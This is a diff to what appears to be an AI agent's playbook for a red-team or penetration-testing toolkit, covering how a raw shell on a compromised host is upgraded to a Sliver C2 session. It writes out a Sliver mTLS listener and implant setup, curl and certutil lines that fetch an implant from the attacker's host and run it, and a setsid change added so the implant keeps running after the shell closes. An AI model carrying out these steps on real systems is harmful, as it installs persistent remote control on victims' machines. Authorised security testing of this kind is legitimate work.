@@ -21,24 +21,29 @@ When a teammate hands you an established shell-server session:
 1. Verify session exists via shell-server list_sessions()
 2. Stabilize the raw shell first: stabilize_shell(session_id)
 3. Determine target OS from platform field
-4. Start Sliver mTLS listener: start_mtls_listener(port=<free_port>)
-5. Generate implant: generate_implant(target_os, arch="amd64",
+4. Clear stale listeners: list_jobs() → kill_job() for every pre-existing mTLS job.
+   Stale jobs cause implant exit code 23 (connection refused). Always start fresh.
+5. Start Sliver mTLS listener: start_mtls_listener(port=<free_port>)
+6. Generate implant: generate_implant(target_os, arch="amd64",
      mtls_host=<callback_ip>, mtls_port=<listener_port>)
-6. Serve implant via HTTP:
+7. Serve implant via HTTP:
    Run: python3 -m http.server <serve_port> --directory <implant_dir>
-7. Download + execute implant through the existing shell:
-   Linux: send_command(session_id, "curl http://<ip>:<port>/<file> -o /tmp/i && chmod +x /tmp/i && nohup /tmp/i &")
+8. Download + execute implant through the existing shell:
+   Linux: send_command(session_id, "curl http://<ip>:<port>/<file> -o /tmp/i && chmod +x /tmp/i && setsid /tmp/i </dev/null >/dev/null 2>&1 &")
+   Note: setsid detaches the implant from the PTY session — it survives close_session.
    Windows: send_command(session_id, "certutil -urlcache -f http://<ip>:<port>/<file> C:\\Windows\\Temp\\i.exe && start /b C:\\Windows\\Temp\\i.exe")
-8. Poll sliver-server list_sessions() for new Sliver session (3s intervals, 10 attempts)
-9. If Sliver session connects:
-   a. Stop the HTTP server
-   b. Send [session-ready] with backend=sliver
-10. If Sliver upgrade fails (download fails, implant killed, port filtered):
+9. Poll sliver-server list_sessions() for new Sliver session (3s intervals, 10 attempts)
+10. If Sliver session connects:
+    a. Stop the HTTP server
+    b. Verify the session is alive: execute(session_id, exe="id") — if this succeeds,
+       Sliver survived. Only now is it safe to close the shell-server session.
+    c. Send [session-ready] with backend=sliver
+11. If Sliver upgrade fails (download fails, implant killed, port filtered):
     a. Fall back to shell-server: send [session-ready] with backend=shell-server
     b. The raw shell still works — don't lose it trying to upgrade
 ```
 
-**Critical: never close the shell-server session until Sliver is confirmed.**
+**Critical: never close the shell-server session until Sliver survives a live execute().**
 The raw shell is the fallback. If C2 upgrade fails, the engagement continues
 via shell-server.
 
